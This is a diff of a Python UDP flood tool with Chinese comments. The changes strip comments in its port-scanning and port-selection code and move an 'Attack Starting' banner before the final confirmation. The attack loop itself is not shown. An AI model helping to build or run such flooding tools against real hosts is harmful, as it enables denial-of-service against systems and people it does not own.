@@ -120,7 +120,7 @@ def check_target(ip, port):
     """简单 TCP 连接测试，返回 True/False"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1.0)   # 缩短超时以提高扫描速度
+        s.settimeout(1.0)
         s.connect((ip, port))
         s.close()
         return True
@@ -128,10 +128,7 @@ def check_target(ip, port):
         return False
 
 def discover_open_port(ip, port_range):
-    """
-    扫描指定端口范围（可迭代对象），返回第一个开放的端口号。
-    如果扫描过程中用户按 Ctrl+C，则返回 None 并提示。
-    """
+    """扫描端口范围，返回第一个开放的端口号"""
     print(f"[*] 正在扫描端口 {min(port_range)}-{max(port_range)}，请耐心等待...")
     try:
         for p in port_range:
@@ -142,20 +139,17 @@ def discover_open_port(ip, port_range):
         return None
     return None
 
-# ==================== 选择扫描模式并获取最终端口 ====================
+# ==================== 确定最终攻击端口 ====================
 
 if target_port is not None and user_provided_port:
-    # 用户已指定端口，先检查该端口
     print(f"[*] 正在检查端口 {target_port} 的连通性...")
     if check_target(target_ip, target_port):
         final_port = target_port
         print(f"[+] 端口 {final_port} 可达，将直接使用。")
     else:
         print(f"[!] 端口 {target_port} 不可达。")
-        # 询问是否进行大量端口扫描
         scan_choice = input("是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
         if scan_choice == 'y':
-            # 选择扫描模式
             print("\n请选择扫描模式：")
             print("1. 快速扫描 (常用端口)")
             print("2. 全端口扫描 (1-65535，耗时较长)")
@@ -199,7 +193,6 @@ if target_port is not None and user_provided_port:
                     else:
                         print("[!] 请输入 y 或 n。")
         else:
-            # 不扫描，直接询问是否强制使用原端口
             while True:
                 force_choice = input("是否使用原端口强制发送？(y/n): ").strip().lower()
                 if force_choice == 'y':
@@ -212,7 +205,6 @@ if target_port is not None and user_provided_port:
                 else:
                     print("[!] 请输入 y 或 n。")
 else:
-    # 用户未指定端口，必须扫描
     print("[*] 用户未指定端口，启动端口扫描...")
     print("请选择扫描模式：")
     print("1. 快速扫描 (常用端口)")
@@ -245,11 +237,14 @@ else:
         sys.exit(1)
     print(f"[+] 探测成功，将使用开放端口: {final_port}")
 
-# 最终确认使用的端口
+# ==================== 显示攻击启动画面 ====================
+
+os.system("clear")
+os.system("figlet Attack Starting")
+
+# ==================== 最终确认（移至 figlet 下方） ====================
+
 print(f"\n[*] 攻击将使用目标端口: {final_port}")
-
-# ==================== 最终确认 ====================
-
 while True:
     confirm = input("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。请确认 (yes/no): ").strip().lower()
     if confirm == 'yes':
@@ -259,9 +254,6 @@ while True:
         sys.exit(0)
     else:
         print("[!] 请输入 yes 或 no。")
-
-os.system("clear")
-os.system("figlet Attack Starting")
 
 # ==================== 攻击发送循环 ====================
 
